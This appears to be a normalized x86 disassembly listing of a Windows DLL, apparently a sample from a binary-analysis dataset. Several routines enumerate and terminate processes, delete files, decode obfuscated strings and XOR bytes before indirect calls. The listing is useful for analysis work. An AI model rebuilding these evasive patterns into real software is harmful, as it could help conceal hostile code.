mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] ebx
jne r-xdata
mov esi [ ebp - 0x268 ]
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
mov eax esi
mov [ ebp - 0x4 ] ebx
call sub_100260d0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] ebx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx esi
call sub_10007e40
test eax eax
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] ebx
call sub_100260d0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea edx [ ebp - 0x40 ]
mov eax 0x92
call sub_1001bb80
lea edx [ ebp - 0x1c ]
mov eax 0x61
call sub_1001bb80
lea edx [ ebp - 0x58 ]
mov eax 0x81
call sub_1001bb80
lea edx [ ebp - 0x2c ]
mov eax 0x14
call sub_1001bb80
mov esi [ esi + 0x12c ]
cmp esi edi
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x6
jmp r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
xor eax eax
lea ebx [ ebx ]
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
cmp [ edi + 0x4 ] 0x2
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ edi + 0x1c ]
mov ebx [ lstrcmpW@IAT ]
lea edx [ ebp - 0x40 ]
push edx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x58 ]
push edx
push eax
call ebx
test eax eax
je r-xdata
lea ebx [ ebp - 0x2c ]
call sub_1003b530
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0x278 ]
push ecx
lea edx [ ebp - 0x274 ]
push edx
call sub_10039230
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x278 ]
mov edx edi
call sub_1005aa10
mov ecx [ ebp - 0x274 ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ edi + 0x14 ]
push edi
call [ DeleteFileW@IAT ]
sub_1003e530
push ebp
mov ebp esp
sub esp 0x648
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ ebp - 0x644 ] edi
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x640 ]
push eax
push edi
mov [ ebp - 0x640 ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push esi
call [ GetCurrentProcessId@IAT ]
mov ebx [ OpenProcess@IAT ]
push eax
push 0x0
push 0x400
mov [ ebp - 0x648 ] eax
call ebx
mov esi eax
test esi esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edi [ CloseHandle@IAT ]
call edi
jmp r-xdata
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
pop esi
pop ebx
mov eax 0x4
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x638 ]
cmp eax [ ebp - 0x648 ]
je r-xdata
mov esi [ ebp - 0x644 ]
lea eax [ ebp - 0x640 ]
push eax
push esi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
push eax
push 0x0
push 0x400
call ebx
mov esi eax
test esi esi
je r-xdata
push esi
call edi
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
je r-xdata
call edi
call edi
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x638 ]
push edx
push eax
push 0x1
call ebx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x644 ]
push ecx
call edi
pop esi
pop ebx
mov eax 0x5
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
test eax eax
je r-xdata
call edi
mov edx [ ebp - 0x644 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x6
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1003e714
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_1003e740
push ebp
mov ebp esp
push 0xffffffff
push sub_10081342
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_10005a90
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push eax
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_1001c310
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_10005a90
push 0xffffffff
push eax
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_1001c310
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_1003e840
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x8 ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0x1c ]
push esi
mov esi [ eax + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x18 ]
mov [ esp + 0x28 ] edx
mov edx [ eax ]
push edi
mov [ esp + 0x28 ] ecx
mov ecx [ eax + 0x20 ]
push edx
mov [ esp + 0x18 ] ecx
call [ SetEvent@IAT ]
inc [ esi + 0x54 ]
cmp [ esi + 0x54 ] 0x5
jae r-xdata
mov [ esi + 0x50 ] 0xff000001
mov eax [ esi + 0x58 ]
cmp eax [ esi + 0x5c ]
jge r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x2
call eax
lea ecx [ esp + 0x18 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x68 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esi ]
mov [ esi + 0x6c ] eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
mov ecx [ esp + 0x14 ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ esi ]
xor eax eax
cmp [ esi + 0x50 ] eax
mov ecx esi
setne al
add eax 0x4
mov [ esi + 0x48 ] eax
mov eax [ edx + 0x4 ]
call eax
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x3
call eax
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventW@IAT ]
mov ecx [ esp + 0x24 ]
mov edi eax
push edi
lea ecx [ ecx + ebx ]
call [ esp + 0x24 ]
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
xor [ esp + 0x10 ] 0x38
xor [ esp + 0x11 ] 0x38
xor [ esp + 0x12 ] 0x38
xor [ esp + 0x13 ] 0x38
push edi
call [ esp + 0x14 ]
mov ecx [ esi + 0x60 ]
imul ecx ecx 0x3e8
push ecx
call [ Sleep@IAT ]
inc [ esi + 0x58 ]
mov edx [ esi + 0x58 ]
cmp edx [ esi + 0x5c ]
jl r-xdata
sub_1003e9a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fd42
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10020490
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10020490
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_100172f0
sub_1003ea65
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
sub_1003eb00
push ebp
mov ebp esp
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push esi
mov esi [ edx + 0xc ]
cmp esi eax
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp esi eax
jne r-xdata
add esi 0x8
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
cmp ecx eax
ja r-xdata
cmp [ esi ] ecx
je r-xdata
push ebx
push edi
mov edi [ ebp + 0x10 ]
lea ebx [ ecx + edi ]
cmp ebx eax
jb r-xdata
mov eax [ edx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_10078600
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn
sub eax ecx
mov edi eax
sub_1003eb62
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100324d8
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1003eb90
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xcc
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_1003ebc0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019b04
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1003ebe7
mov edi edi
push ebp
mov ebp esp
call sub_10044fed
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1003ec10
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_1005927e
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1003ec68
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10042119
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100276d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1003ed16
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_1003ede0
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push ebx
mov ebx [ edx + 0x10 ]
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov esi [ edi + 0x10 ]
mov eax esi
cmp eax esi
jae r-xdata
mov edx [ edx ]
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
mov eax edi
mov eax [ edi ]
jmp r-xdata
add edi 0x1c
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp esi ebx
jb r-xdata
push ecx
push edx
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
pop esi
mov eax edi
pop ebx
cmp esi ebx
setne al
test eax eax
je r-xdata
sub_1003ee60
push ebp
mov ebp esp
push 0xffffffff
push sub_1008225d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x92c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov esi ecx
mov [ ebp - 0x92c ] esi
mov [ ebp - 0x8e0 ] edi
mov [ ebp - 0x8dc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x918 ] edi
mov [ ebp - 0x914 ] edi
mov [ ebp - 0x8e8 ] edi
mov [ ebp - 0x8e4 ] edi
mov [ ebp - 0x908 ] edi
mov [ ebp - 0x904 ] edi
mov [ ebp - 0x8f8 ] edi
mov [ ebp - 0x8f4 ] edi
mov [ ebp - 0x900 ] edi
mov [ ebp - 0x8fc ] edi
mov [ ebp - 0x8f0 ] edi
mov [ ebp - 0x8ec ] edi
mov [ ebp - 0x8d8 ] edi
mov [ ebp - 0x8d4 ] edi
mov [ ebp - 0x920 ] edi
mov [ ebp - 0x91c ] edi
mov [ ebp - 0x910 ] edi
mov [ ebp - 0x90c ] edi
mov [ ebp - 0x928 ] edi
mov [ ebp - 0x924 ] edi
mov [ ebp - 0x4 ] 0xa
cmp esi edi
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax 0x31
call sub_1001bb80
push esi
lea edx [ ebp - 0x8e0 ]
lea ecx [ ebp - 0x104 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x8e0 ]
mov ecx [ eax ]
push ecx
call [ StrToIntW@IAT ]
mov [ rw-data ] eax
lea edx [ ebp - 0x1b8 ]
mov eax 0x15d
call sub_1001bb80
push esi
lea edx [ ebp - 0x918 ]
lea ecx [ ebp - 0x1b8 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x918 ]
mov esi [ edx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x3
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x144 ]
xor eax eax
call sub_1001bb80
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x8e8 ]
lea ecx [ ebp - 0x144 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x4
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8e8 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x5
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x18c ]
mov eax 0xd0
call sub_1001bb80
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x908 ]
lea ecx [ ebp - 0x18c ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x6
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x908 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x7
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x124 ]
mov eax 0x6d
call sub_1001bb80
mov ebx [ ebp - 0x92c ]
push ebx
lea edx [ ebp - 0x8f8 ]
lea ecx [ ebp - 0x124 ]
call sub_10053a60
test eax eax
jne r-xdata
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
